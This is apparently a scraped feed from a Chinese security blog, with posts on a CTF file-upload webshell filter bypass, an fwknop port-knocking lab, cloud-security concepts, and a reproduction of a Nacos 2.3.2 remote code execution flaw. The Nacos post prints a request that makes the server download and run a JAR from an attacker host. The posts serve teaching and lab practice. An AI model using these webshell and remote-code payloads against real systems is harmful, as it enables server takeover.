<span class="number">8</span>) + <span class="title function_ invoke__">ord</span>(<span class="variable">$short</span>[<span class="number">0</span>]);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$short</span> = (<span class="title function_ invoke__">ord</span>(<span class="variable">$short</span>[<span class="number">0</span>]) &lt;&lt; <span class="number">8</span>) + <span class="title function_ invoke__">ord</span>(<span class="variable">$short</span>[<span class="number">1</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$short</span>;</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">eof</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> !<span class="variable language_">$this</span>-&gt;binData||(<span class="title function_ invoke__">strlen</span>(<span class="variable">$this</span>-&gt;binData) === <span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>同样我们保存为php文件，然后使用命令行运行，如下所示</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240726123927496.png" alt="image-20240726123927496"></p><p>我们用二进制文件打开，如下所示</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/fcbad4e5ed902333cce51cc505eec93c.png" alt="fcbad4e5ed902333cce51cc505eec93c"></p><p>我们可以看到确实插进去了一个phpinfo();</p><h2 id="变异免杀"><a href="#变异免杀" class="headerlink" title="变异免杀"></a>变异免杀</h2><p>当系统限制我们上传带有后门的php文件的时候，即会对我们的文件的内容的关键词进行检测，比如过滤<code>system、eval</code>等，这个时候我们利用拼接重组进行绕过即可，这样的过程就叫做后门的变异免杀，我们以CTFSHOW的168关为例子进行演示，这题过滤<code>system</code>，我们直接进行如下构造</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">payload：<span class="meta">&lt;?php</span> <span class="variable">$a</span>=<span class="string">&#x27;syste&#x27;</span>;<span class="variable">$b</span>=<span class="string">&#x27;m&#x27;</span>;<span class="variable">$c</span>=<span class="variable">$a</span>.<span class="variable">$b</span>;<span class="variable">$c</span>(<span class="string">&#x27;tac ../flagaa.php&#x27;</span>);<span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="variable">$a</span>=<span class="string">&#x27;syste&#x27;</span>.<span class="string">&#x27;m&#x27;</span>;<span class="variable">$a</span>(<span class="string">&#x27;tac ../flagaa.php&#x27;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/2504969-20230912170958605-809729497.png" alt="1645517601496-15ba1841-2dd3-4df6-8502-7b0b02cb0dda.png"></p><p>这就是我们最简单的变异免杀，同时这也是需要我们自己去尝试才能知道如何进行变异最好</p>]]></content>
      
      
      <categories>
          
          <category> 网络攻防 </category>
          
          <category> WEB攻防 </category>
          
          <category> 文件上漏洞 </category>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 文件上传 </tag>
            
            <tag> 二次渲染 </tag>
            
            <tag> 变异免杀 </tag>
            
            <tag> 条件竞争 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>零信任技术之fwknop单包认证敲门</title>
      <link href="/post/3e117185.html"/>
      <url>/post/3e117185.html</url>
      
        <content type="html"><![CDATA[<h2 id="实验背景"><a href="#实验背景" class="headerlink" title="实验背景"></a>实验背景</h2><p>服务器某个端口服务受到防火墙的保护情况下，外界机器无法访问该端口上的服务</p><h2 id="实验目的"><a href="#实验目的" class="headerlink" title="实验目的"></a>实验目的</h2><p>通过在服务器和客户机上分别部署feknop敲门服务端和敲门客户端并进行配置，可以只让授权的客户端所在的机器敲开服务器的受保护的22号端口</p><h2 id="实验准备"><a href="#实验准备" class="headerlink" title="实验准备"></a>实验准备</h2><p>需要有两台Linux虚拟机，我这里其中一台为Ubuntu，一台为kali，我们以kali作为服务器，以Ubuntu作为客户机，要让Ubuntu想办法敲开Linux的22号端口</p><h3 id="客户机安装配置fwknop客户端"><a href="#客户机安装配置fwknop客户端" class="headerlink" title="客户机安装配置fwknop客户端"></a>客户机安装配置fwknop客户端</h3><p>使用命令下载fwknop-客户机</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt update</span><br><span class="line">sudo apt install fwknop-client</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240721142010114.png" alt="image-20240721142010114"></p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240721145015032.png" alt="image-20240721145015032"></p><p>生成敲门凭证（<strong>千万不要加sudo，如果是root用户，请切换为普通用户</strong>）</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">fwknop -A tcp/22 -a xxx -D yyy --key-gen --use-hmac 1 --save-rc-stanza</span><br></pre></td></tr></table></figure><p>其中xxx替换为我们的Ubuntu的ip，yyy替换为服务器的ip，我们首先用<code>ifconfig</code>查看一下我们的服务端和客户端的ip</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240721145300342.png" alt="image-20240721145300342"></p><p>比如我的是这样的</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">fwknop -A tcp/22 -a 192.168.153.133 -D 192.168.153.129 --key-gen --use-hmac 1 --save-rc-stanza</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240721150322476.png" alt="image-20240721150322476"></p><p>这会在我们的家目录下生成一个.fwknoprc文件，我们进入下面的目录，并在<code>/home/borgeous</code>下提取这个文件内容里面的HMAC验证码以及密码的base64编码</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /home/borgeous</span><br><span class="line">grep KEY .fwknoprc</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240721151037418.png" alt="image-20240721151037418"></p><p>将这两个复制下来，以避免后续重新创建，这两个值改变</p><h3 id="服务器安装配置"><a href="#服务器安装配置" class="headerlink" title="服务器安装配置"></a>服务器安装配置</h3><p>首先确保服务器已经启动sshd服务</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">systemctl status ssh</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240721151236318.png" alt="image-20240721151236318"></p><p>这里代表着我们的ssh服务已经开启</p><p>接下来我们在服务器上安装、配置fwknop-server，我们使用如下命令进行安装</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt update</span><br><span class="line">sudo apt install fwknop-server</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240721151511423.png" alt="image-20240721151511423"></p><p>执行命令配置两个文件：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo vim /etc/fwknop/access.conf</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240721152723451.png" alt="image-20240721152723451"></p><p>清空配置文件，再添加如下内容</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">SOURCE ANY</span><br><span class="line">REQUIRE_SOURCE_ADDRESS Y</span><br><span class="line">OPEN_PORTS tcp/22, tcp/80, udp/22, udp/80</span><br><span class="line">FW_ACCESS_TIMEOUT 20</span><br><span class="line">KEY_BASE64 vJQ0gldvD73JBWqzk2cU0oOF/S0P5fohSrvRB1l3H3g=</span><br><span class="line">HMAC_KEY_BASE64</span><br><span class="line">knXk7/TDbowujaJEKIxAt4lW4yuq2PvYxEwv0oFpsiUtyVLVVML1vCzlc08SHPJa+kLctKb6ci1CGjO3W6+cQw==</span><br></pre></td></tr></table></figure><p>其中的key和hmackey的base64编码替换成客户端的，这样就配置好了客户端敲门凭证</p><p>接下来我们使用ip address获取服务器的ip和网卡名</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240721154538022.png" alt="image-20240721154538022"></p><p>如上，服务器IP为192.168.153.129，网卡名叫eth0，服务器配置另外一个文件</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo vim /etc/fwknop/fwknopd.conf</span><br></pre></td></tr></table></figure><p>把里面东西全删了，输入以下内容</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">PCAP_INTF eth0;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240721155448147.png" alt="image-20240721155448147"></p><h3 id="服务器配置防火墙"><a href="#服务器配置防火墙" class="headerlink" title="服务器配置防火墙"></a>服务器配置防火墙</h3><p>使用如下命令：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo iptables -I INPUT 1 -i eth0 -p tcp --dport 22 -j DROP</span><br><span class="line">sudo iptables -I INPUT 1 -i eth0 -p tcp --dport 22 -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT</span><br></pre></td></tr></table></figure><p>如上命令实现入站规则无法使用tcp协议连通22端口，也就是ssh服务</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240721160110649.png" alt="image-20240721160110649"></p><p>当启动之后，我们的xshell立即就停用了</p><h3 id="确认配置正常"><a href="#确认配置正常" class="headerlink" title="确认配置正常"></a>确认配置正常</h3><p>在服务端，输入命令启动fwknop服务</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo fwknopd</span><br></pre></td></tr></table></figure><p>再次使用这个命令，有输出代表配置正常，如下所示</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240721160402830.png" alt="image-20240721160402830"></p><h2 id="效果确认"><a href="#效果确认" class="headerlink" title="效果确认"></a>效果确认</h2><p>客户端连接服务器sshd服务，发现无法连接</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh 192.168.153.129</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240721162602661.png" alt="image-20240721162602661"></p><p>一直卡在这里不动了，代表我们拒绝了ssh服务</p><p>我们尝试敲门后连接，在客户端输入命令以进行敲门，也不要加sudo</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">fwknop -n 192.168.153.129</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240721162924751.png" alt="image-20240721162924751"></p><p>我们再ssh该用户，发现成功</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240721163847023.png" alt="image-20240721163847023"></p><p>实验到此结束</p>]]></content>
      
      
      <categories>
          
          <category> 网络攻防 </category>
          
          <category> 云安全 </category>
          
          <category> 实战 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> fwknop </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>川大实训-认识、了解云安全</title>
      <link href="/post/d2bee70b.html"/>
      <url>/post/d2bee70b.html</url>
      
        <content type="html"><![CDATA[<h2 id="什么是ECS？产生背景和优势是什么？"><a href="#什么是ECS？产生背景和优势是什么？" class="headerlink" title="什么是ECS？产生背景和优势是什么？"></a>什么是ECS？产生背景和优势是什么？</h2><p>云厂商一般会将一台物理服务器分割为多个虚拟机，跟我们自己在VMware建立虚拟机是一个道理，每个虚拟机都有自己独立的操作系统、资源（CPU、内存、存储空间）和公网IP地址，这样的虚拟机就是VPS，虚拟专用服务器，但是VPS有一个缺点，就是不支持用户自主升降级，资源是预先分配好的并且不易于动态调整的，即如果你是1核1G的服务器，想要给他升级到2核2G的，在VPS中是实现不了的，但是如果加入自主升级降级的功能，就成了ECS（Elastic Compute Service，弹性计算服务），可以根据用户的需求随时调整CPU、内存、磁盘和带宽，所以被称为弹性服务器，这就是ECS产生的背景和优势，基于VPS不能自主升降级而产生ECS</p><h2 id="什么是安全组？有何作用？"><a href="#什么是安全组？有何作用？" class="headerlink" title="什么是安全组？有何作用？"></a>什么是安全组？有何作用？</h2><p>安全组是一种虚拟防火墙，能够控制ECS实例的出入站流量。安全组的入站方向控制ECS实例的入站流量，出方向控制ECS实例的出战流量，一般我们都对入站流量进行限制，而不限制出战流量，在安全组规则设定中，我们可以限制特定IP的访问，也可以限制特定端口是否开放，最好别把入站端口全部打开，因为我的服务器因为打开所有的入站规则三天被打了两次，如下是我的服务器安全组示例</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/660268872c10ed2f16edaa660a7bf897.png" alt="660268872c10ed2f16edaa660a7bf897"></p><p>授权IP就是允许访问的IP地址，<code>0.0.0.0/0</code>表示对所有IP都可以，即我没有对特定IP进行限制，端口范围即你想操作的端口，协议也可以进行选择，好好配置安全组，可以极小的减少自己服务器被攻击的可能性</p><h2 id="阿里云中什么是RAM，有何作用？"><a href="#阿里云中什么是RAM，有何作用？" class="headerlink" title="阿里云中什么是RAM，有何作用？"></a>阿里云中什么是RAM，有何作用？</h2><p>RAM（Resource Access Management），访问控制，是阿里云提供的管理用户身份与资源访问权限的服务。为什么要有这个访问控制的出现呢？是因为在购买云上资源的时候，会给购买者串账号密码，以方便云服务器对访问者进行鉴权，这对于个人云上资源是没有任何问题的，但是如果是一个大型公司的云上资源，倘若不做权限控制的话，仅仅靠一个账号密码就能拿下整个云上资源，那么这个时候对于公司来说就不敢轻易把这个账号密码告诉自己的所有员工，不然很容易就造成泄露。这个时候我们的RAM就发挥了作用，通过访问控制，我们可以灵活地设置员工的权限，甚至可以限制员工的登录环境，如下图所示</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240720152749381.png" alt="image-20240720152749381"></p><p>同样允许员工创建自己的私有数据空间以保证自己的数据的安全，允许我们按照权限进行分组，等等，方便我们更好的使用云安全，保障云上数据的安全</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240720153029863.png" alt="image-20240720153029863"></p><h2 id="什么是OSS，有何作用和优势？"><a href="#什么是OSS，有何作用和优势？" class="headerlink" title="什么是OSS，有何作用和优势？"></a>什么是OSS，有何作用和优势？</h2><p>阿里云对象存储服务（Object Storage Service，简称 OSS），OSS具有与平台无关的RESTful API接口，我们可以在任何应用、任何时间、任何地点存储和访问任意类型的数据，与自建存储相比，OSS存在易用性、持久性、数据安全等方面的优势，下面直接复制阿里云的官方文档</p><div class="table-container"><table><thead><tr><th style="text-align:center"><strong>对比项</strong></th><th><strong>对象存储OSS</strong></th><th><strong>自建服务器存储</strong></th></tr></thead><tbody><tr><td style="text-align:center">易用性</td><td>提供标准的RESTful API接口、丰富的SDK包、客户端工具、控制台。您可以像使用文件一样方便地上传、下载、检索、管理用于Web网站或者移动应用的海量数据。不限制存储空间大小。您可以根据所需存储量无限扩展存储空间，解决了传统硬件存储扩容问题。支持流式写入和读取。适合视频等大文件的同步读写业务场景。支持数据生命周期管理。您可以通过设置生命周期规则，将到期数据批量删除或者转储为更低成本的低频访问、归档存储、冷归档存储或者深度冷归档存储。</td><td>存储受硬盘容量限制，需人工扩容。不支持流式写入和读取。手动删除数据。</td></tr><tr><td style="text-align:center">持久性</td><td>OSS作为阿里巴巴全集团数据存储的核心基础设施，多年支撑双11业务高峰，历经高可用与高可靠的严苛考验。OSS的多重冗余架构设计，为数据持久存储提供可靠保障。同时，OSS基于高可用架构设计，消除单点故障，确保数据业务的持续性。服务可用性最高可达99.995%。数据设计持久性最高可达99.9999999999%（12个9）。规模自动扩展，不影响对外服务。OSS会通过计算网络流量包的校验和，验证数据包在客户端和服务端之间传输中是否出错，保证数据完整传输。OSS针对对象的操作具有强一致性。当对象上传或复制成功时，即可立即读取，且冗余写入多个设备。采用数据冗余存储机制，将每个对象的不同冗余存储在同一个区域内多个设施的多个设备上，确保硬件失效时的数据持久性和可用性。当数据存入OSS后，OSS会检测和修复丢失的冗余，确保数据持久性和可用性。OSS会周期性地通过校验等方式验证数据的完整性，及时发现因硬件失效等原因造成的数据损坏。当检测到数据有部分损坏或丢失时，OSS会利用冗余数据重建并修复损坏数据。</td><td>受限于硬件持久性，易出问题，当出现磁盘坏道时，容易出现不可逆转的数据丢失。人工数据恢复困难、耗时、耗力。</td></tr><tr><td style="text-align:center">数据安全</td><td>提供企业级多层次安全防护，包括服务端加密、客户端加密、防盗链、通过Bucket Policy限制IP黑白名单访问、细粒度权限管控、STS和URL鉴权与授权机制、WORM特性、日志审计等。提供用户级别资源隔离机制和多集群同步机制，支持异地容灾机制。支持基于SSL和TLS的HTTPS加密传输，有效防止数据在云端的潜在安全风险。提供版本控制功能，防止文件被误删除或覆盖而造成数据丢失。获得多项合规认证，包括SEC、FINRA等，满足企业数据安全与合规要求。</td><td>需要另外购买清洗和黑洞设备。需要单独实现安全机制。</td></tr><tr><td style="text-align:center">成本</td><td>可通过多线BGP接入运营商骨干网线路，带宽资源充足，上行流量免费。无需运维人员与托管费用，0成本运维。</td><td>存储受硬盘容量限制，需人工扩容。单线或双线接入速度慢，有带宽限制，峰值时期需人工扩容。需专人运维，成本高。</td></tr><tr><td style="text-align:center">智能存储</td><td>提供多种数据处理能力，例如图片处理、视频截帧、文档预览、图片场景识别、SQL查询等，并无缝对接Hadoop生态以及阿里云函数计算、EMR、DataLakeAnalytics、BatchCompute、MaxCompute、DBS等产品，满足企业数据分析与管理的需求。</td><td>需要额外采购，单独部署。</td></tr><tr><td style="text-align:center">加速访问</td><td>互联网访问加速：提供传输加速服务，可优化互联网传输链路和协议栈，大幅减少数据远距离传输超时的比例，极大地提升用户上传和下载体验。更多信息，请参见<a href="https://help.aliyun.com/zh/oss/user-guide/enable-transfer-acceleration#concept-1813960">传输加速</a>。内容加速分发：OSS作为源站，搭配CDN进行内容分发，提升同一个文件被重复下载的体验。</td><td>不支持。</td></tr></tbody></table></div><h2 id="AccessKey泄露有何风险？"><a href="#AccessKey泄露有何风险？" class="headerlink" title="AccessKey泄露有何风险？"></a>AccessKey泄露有何风险？</h2><p>AccessKey即访问密钥，相当于登陆密码，只是使用的场景不同，密码用于登录云服务器的控制面板，而AccessKey用于其他程序调用云服务API，如果不调用API，我们就不需要创建AccessKey</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/p45369.png" alt="新建用户AccessKey"></p><p>AccessKey泄露最大的风险就是自己的云上资源丢失，云服务器的权限被别人恶意接管，所以保护好自己的AccessKey非常重要，千万不要把其写进代码中</p><h2 id="什么是SSRF漏洞？"><a href="#什么是SSRF漏洞？" class="headerlink" title="什么是SSRF漏洞？"></a>什么是SSRF漏洞？</h2><p>SSRF（Server Side Request Forgery，服务端请求伪造）是一种由攻击者构造形成由服务端发起请求的一个安全漏洞，一般情况下，SSRF的攻击目标是从外网无法访问的内部系统，由于内网难以进行攻击，所以一般要由服务端进行发起</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/b53de209637a4a88853e1762d639b5d3.png" alt="在这里插入图片描述"></p><p>SSRF形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能而没有对目标地址做过滤和限制，黑客操作服务端从指定URL地址获取网页文本内容，加载指定地址的图片，下载等等。利用的是服务端的请求伪造。ssrf是利用存在缺陷的web应用作为代理攻击远程和本地的服务器</p><h2 id="阿里云中SSRF漏洞的危害是什么？修复思路？"><a href="#阿里云中SSRF漏洞的危害是什么？修复思路？" class="headerlink" title="阿里云中SSRF漏洞的危害是什么？修复思路？"></a>阿里云中SSRF漏洞的危害是什么？修复思路？</h2><p><strong>危害</strong>：SSRF的主要危害就是会造成控制台权限被接管，进而造成权限丢失，数据丢失等</p><p><strong>主要问题及修复思路：</strong></p><ol><li><p>应用存在漏洞，需要修补应用漏洞。</p></li><li><p>RAM 角色权限过大，导致可以通过该角色的权限进行创建子用户以及给子用户授予高权限等操作</p><p>整改：在为 RAM 角色赋予权限时，避免赋予过高的权限，只赋予自己所需要的权限。</p></li><li><p>元数据未做加固访问，导致一旦目标存在 SSRF 漏洞，元数据就存在被获取的风险。</p><p>整改：在「系统配置」的「高级选项」中将「实例元数据访问模式」设置为「仅加固模式」</p></li></ol>]]></content>
      
      
      <categories>
          
          <category> 网络攻防 </category>
          
          <category> 云安全 </category>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SSRF </tag>
            
            <tag> 云安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>nacos 1day保姆级复现</title>
      <link href="/post/6fe6c328.html"/>
      <url>/post/6fe6c328.html</url>
      
        <content type="html"><![CDATA[<h1 id="产品概述"><a href="#产品概述" class="headerlink" title="产品概述"></a>产品概述</h1><p>NACOS是一个开源的服务发现、配置管理和服务治理平，属于阿里巴巴的一款开源产品</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240720090243294.png" alt="image-20240720090243294"></p><p>2.3.2版本的nacos存在远程代码执行漏洞，攻击者可以在远程服务器上执行任意代码，进而让攻击者完全控制受影响的系统，导致严重的安全问题</p><h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>我的环境是搭建在虚拟机Ubuntu上的，折腾搭建靶场也折腾了蛮久的，主要是编译太久了，大概有一个小时才编译好吧，这里我会详细记录每一步搭建过程，以帮助大家更好地搭建靶场</p><p>我的Ubuntu版本是22.0.4TLS版本，我觉得版本影响应该不是很大，首先要确保自己的虚拟机里有JDK环境，如果你是新搭建的虚拟机，我建议先要安装JDK，使用如下的命令安装JDK</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt install openjdk-17</span><br></pre></td></tr></table></figure><p>安装好JDK后我们去GitHub上拉取项目，项目地址如下</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line">https://github.com/alibaba/nacos/releases/tag/2.3.2</span><br></pre></td></tr></table></figure><p>我这里使用的是git clone，相关命令如下所示</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/alibaba/nacos.git</span><br><span class="line"><span class="built_in">cd</span> nacos</span><br><span class="line">git checkout tags/2.3.2 <span class="comment">#将2.3.2版本的标签提取出来</span></span><br><span class="line">git describe --tags <span class="comment">#查看自己的版本是不是2.3.2</span></span><br><span class="line">sudo apt install maven <span class="comment">#安装maven</span></span><br><span class="line">mvn -Prelease-nacos -Dmaven.test.skip=<span class="literal">true</span> clean install -U <span class="comment">#构建项目，这一步时间比较长，耐心等待，我构建了快1个小时</span></span><br><span class="line"><span class="built_in">cd</span> distribution/target</span><br><span class="line">unzip nacos-server-2.3.2.zip</span><br><span class="line"><span class="built_in">cd</span> nacos/bin</span><br><span class="line">./startup.sh -m standalone <span class="comment">#启动项目</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/5c85ffa8-6389-4b21-a350-ccfa9774719d.png" alt="5c85ffa8-6389-4b21-a350-ccfa9774719d"></p><p>出现上面的结果就代表成功，我们直接用浏览器访问我们虚拟机的8848端口（记得提前放行），比如我访问<code>http://192.168.153.133:8848/nacos/</code>就可以打开我们想要的靶机，如下图所示</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240720093000574.png" alt="image-20240720093000574"></p><h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><p>我们先去github上把poc下载下来，但是现在好像被删了，还好我已经下载了</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line">https://github.com/ayoundzw/nacos-poc</span><br><span class="line">https://github.com/ikun123234/nacos-poc #上面那个访问不了就去这里下载</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240720094306472.png" alt="image-20240720094306472"></p><p>在实现漏洞复现之前，要先安装好requirements.txt中的东西，即安装好flask和requests，然后我们将config.py中的host改成自己本机局域网IP，端口设置为没被占用的端口，这里实际上是让我们启动一个web服务，然后让nacos去访问我的web服务的内容</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240720095034460.png" alt="image-20240720095034460"></p><p>运行命令<code>python service.py</code>启动web服务，出现下面的情况就代表我们服务启动成功</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240720095342230.png" alt="image-20240720095342230"></p><p>然后我们再运行一下<code>python exploit.py</code>，看看会有什么效果出现</p><p>我们可以发现会弹出计算器，因为我们输入的默认命令就是<code>calc;</code>达到任意命令执行的目的，复现成功</p><h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>有点看不太懂这个漏洞，和内存🐎有点关系，这边直接嫖带头大哥的解释了</p><p>当我们运行我们的指令的时候，会发现我们会去请求service.py启动的web服务的./download模块</p><p>我们转到service.py，看到里面写了个payload</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240720112821731.png" alt="image-20240720112821731"></p><p>很显然，根本看不懂在写些什么，我们先看exploit.py干了什么，在exploit.py中加个代理，抓取的数据包如下</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/nacos/v1/cs/ops/data/removal</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>host</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>python-requests/2.28.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>488</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=111111111111111111111111</span><br><span class="line"></span><br><span class="line"><span class="language-pgsql"><span class="comment">--11111111111111111111111111111</span></span></span><br><span class="line"><span class="language-pgsql">Content-Disposition: form-data; <span class="type">name</span>=&quot;file&quot;; filename=&quot;file&quot;</span></span><br><span class="line"><span class="language-pgsql"></span></span><br><span class="line"><span class="language-pgsql"><span class="keyword">CALL</span> sqlj.install_jar(<span class="string">&#x27;http://192.168.197.56:8000/download&#x27;</span>, <span class="string">&#x27;NACOS.aKjwPoiU&#x27;</span>, <span class="number">0</span>)</span></span><br><span class="line"><span class="language-pgsql"></span></span><br><span class="line"><span class="language-pgsql">        <span class="keyword">CALL</span> SYSCS_UTIL.SYSCS_SET_DATABASE_PROPERTY(<span class="string">&#x27;derby.database.classpath&#x27;</span>,<span class="string">&#x27;NACOS.aKjwPoiU&#x27;</span>)</span></span><br><span class="line"><span class="language-pgsql"></span></span><br><span class="line"><span class="language-pgsql">        <span class="keyword">CREATE</span> <span class="keyword">FUNCTION</span> S_EXAMPLE_aKjwPoiU( PARAM <span class="type">VARCHAR</span>(<span class="number">2000</span>)) <span class="keyword">RETURNS</span> <span class="type">VARCHAR</span>(<span class="number">2000</span>) PARAMETER STYLE JAVA <span class="keyword">NO</span> <span class="keyword">SQL</span> <span class="keyword">LANGUAGE</span> JAVA <span class="keyword">EXTERNAL</span> <span class="type">NAME</span> <span class="string">&#x27;test.poc.Example.exec&#x27;</span></span></span><br><span class="line"><span class="language-pgsql"></span></span><br><span class="line"><span class="language-pgsql"><span class="comment">--111111111111111111111111111111--</span></span></span><br></pre></td></tr></table></figure><p>我们可以直接执行service的url地址，比如<code>http://192.168.153.1:8000/download</code>直接保存为1.jar，反编译就可以看见里面的内容</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240720114617842.png" alt="image-20240720114617842"></p><p>我们可以直接执行，就可以弹计算器了</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Example</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">ret</span> <span class="operator">=</span> exec(<span class="string">&quot;ipconfig&quot;</span>);</span><br><span class="line">        System.out.println(ret);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">exec</span><span class="params">(String cmd)</span> &#123;</span><br><span class="line">        <span class="type">StringBuffer</span> <span class="variable">bf</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuffer</span>();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">charset</span> <span class="operator">=</span> <span class="string">&quot;utf-8&quot;</span>;</span><br><span class="line">            <span class="type">String</span> <span class="variable">osName</span> <span class="operator">=</span> System.getProperty(<span class="string">&quot;os.name&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (osName != <span class="literal">null</span> &amp;&amp; osName.startsWith(<span class="string">&quot;Windows&quot;</span>)) &#123;</span><br><span class="line">                charset = <span class="string">&quot;gbk&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="type">Process</span> <span class="variable">p</span> <span class="operator">=</span> Runtime.getRuntime().exec(cmd);</span><br><span class="line">            <span class="type">InputStream</span> <span class="variable">fis</span> <span class="operator">=</span> p.getInputStream();</span><br><span class="line">            <span class="type">InputStreamReader</span> <span class="variable">isr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(fis, charset);</span><br><span class="line">            <span class="type">BufferedReader</span> <span class="variable">br</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(isr);</span><br><span class="line">            <span class="keyword">while</span> (<span 